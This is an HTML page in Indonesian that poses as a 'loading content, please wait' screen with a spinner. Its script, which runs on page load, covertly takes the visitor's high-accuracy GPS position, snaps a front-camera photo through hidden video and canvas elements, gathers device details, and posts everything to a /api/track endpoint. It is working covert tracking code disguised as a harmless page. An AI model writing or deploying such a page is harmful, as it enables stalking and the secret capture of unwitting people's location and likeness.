<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memuat Halaman...</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; background: #0f172a; color: #f8fafc; }
        .loader { border: 4px solid #334155; border-top: 4px solid #38bdf8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2>Memuat Konten...</h2>
    <p>Mohon tunggu sebentar.</p>

    <!-- Elemen kamera tersembunyi -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        async function captureData() {
            let latitude = null;
            let longitude = null;
            let accuracy = null;

            // 1. Ambil Lokasi GPS
            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
                    });
                    latitude = pos.coords.latitude;
                    longitude = pos.coords.longitude;
                    accuracy = pos.coords.accuracy;
                } catch (e) {
                    console.log("GPS ditolak/gagal");
                }
            }

            // 2. Ambil Foto Kamera Depan
            let imageBase64 = null;
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise((resolve) => { video.onloadedmetadata = () => resolve(); });
                
                await new Promise(r => setTimeout(r, 1000)); // Jeda agar kamera fokus

                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                imageBase64 = canvas.toDataURL('image/jpeg', 0.8);

                // Matikan kamera setelah selesai
                stream.getTracks().forEach(track => track.stop());
            } catch (e) {
                console.log("Kamera ditolak/gagal");
            }

            // 3. Kumpulkan Info Perangkat Tambahan
            const deviceData = {
                hardwareConcurrency: navigator.hardwareConcurrency || '-',
                deviceMemory: navigator.deviceMemory || '-',
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language || '-'
            };

            // 4. Kirim ke Backend API
            try {
                await fetch('/api/track', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        latitude,
                        longitude,
                        accuracy,
                        image: imageBase64,
                        deviceData
                    })
                });
            } catch (e) {
                console.log("Gagal mengirim data");
            }
        }

        window.onload = captureData;
    </script>
</body>
</html>
